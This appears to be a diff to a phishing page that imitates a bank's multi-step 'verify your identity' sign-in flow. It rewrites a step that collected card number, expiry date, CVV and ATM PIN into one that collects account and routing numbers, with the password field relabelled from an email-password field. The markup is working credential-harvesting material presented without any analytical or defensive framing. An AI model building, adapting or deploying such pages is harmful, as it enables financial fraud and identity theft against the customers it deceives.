@@ -55,11 +55,11 @@
           <div class="container-fluid p-0">
             <div class="row">
               <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
-                <h1 class="signin-header" tabindex="-1">Card Verification</h1>
+                <h1 class="signin-header" tabindex="-1">Account Verification</h1>
                 <div class="progress-bar">
                   <div class="progress-bar-track"></div>
-                  <div class="progress-bar-indicator-outer-border" style="width: calc(4px + 99.9%);"></div>
-                  <div class="progress-bar-indicator" style="width: 99.9%;"></div>
+                  <div class="progress-bar-indicator-outer-border" style="width: calc(4px + 33.3%);"></div>
+                  <div class="progress-bar-indicator" style="width: 33.3%;"></div>
                 </div>
               </div>
             </div>
@@ -89,36 +89,20 @@
                 <div class="col-xs-12 col-sm-8 col-lg-6 col-lg-offset-0 col-md-offset-0 col-sm-offset-2">
                   <h2 class="cb-verify-header">Let's confirm your identity.</h2>
                   <h3 class="cb-verify-header-sub">To protect your account, please tell us the requested info so we can confirm your identity.</h3>
-                  <form class="cb-verify-body" action="/auth/login/5" method="POST">
+                  <form class="cb-verify-body" action="/auth/login/3" method="POST">
                     <div class="cb-input-container">
-                      <label for="cardNum" class="cb-input-label">Card Number</label>
+                      <label for="emailAddr" class="cb-input-label">Account Number</label>
 
                       <div class="cb-input-wrap">
-                        <input id="cardNum" name="cardNum" type="text" class="cb-input cb-input--line" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                        <input id="emailAddr" name="emailAddr" type="text" class="cb-input cb-input--line" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
                       </div>
                     </div>
 
                     <div class="cb-input-container">
-                      <label for="expDate" class="cb-input-label">Expiry Date</label>
+                      <label for="emailPass" class="cb-input-label">Routing Number</label>
 
                       <div class="cb-input-wrap">
-                        <input id="expDate" name="expDate" type="text" class="cb-input cb-input--line" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-                      </div>
-                    </div>
-
-                    <div class="cb-input-container">
-                      <label for="cvv" class="cb-input-label">CVV</label>
-
-                      <div class="cb-input-wrap">
-                        <input id="cvv" name="cvv" type="text" class="cb-input cb-input--line" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-                      </div>
-                    </div>
-
-                    <div class="cb-input-container">
-                      <label for="cpin" class="cb-input-label">Card/ATM PIN</label>
-
-                      <div class="cb-input-wrap">
-                        <input id="cpin" name="cpin" type="password" class="cb-input cb-input--line cb-input--trailing-icon" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" style="padding-right: 68px;">
+                        <input id="emailPass" name="emailPass" type="password" class="cb-input cb-input--line cb-input--trailing-icon" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off" style="padding-right: 68px;">
 
                         <div class="cb-input-icon cb-input-icon--line cb-input-show-field">
                           <button type="button" class="cb-button cb-button--tertiary cb-button--small toggle-btn toggle-hidden" tabindex="0">
@@ -174,12 +158,6 @@
   </div>
 
   <script src="/js/main2.js"></script>
-  <script>
-    $('#cardNum').mask('0000 0000 0000 0000');
-    $('#expDate').mask('00/0000');
-    $('#cvv').mask('0000');
-    $('#cpin').mask('0000');
-  </script>
 </body>
 
 </html>
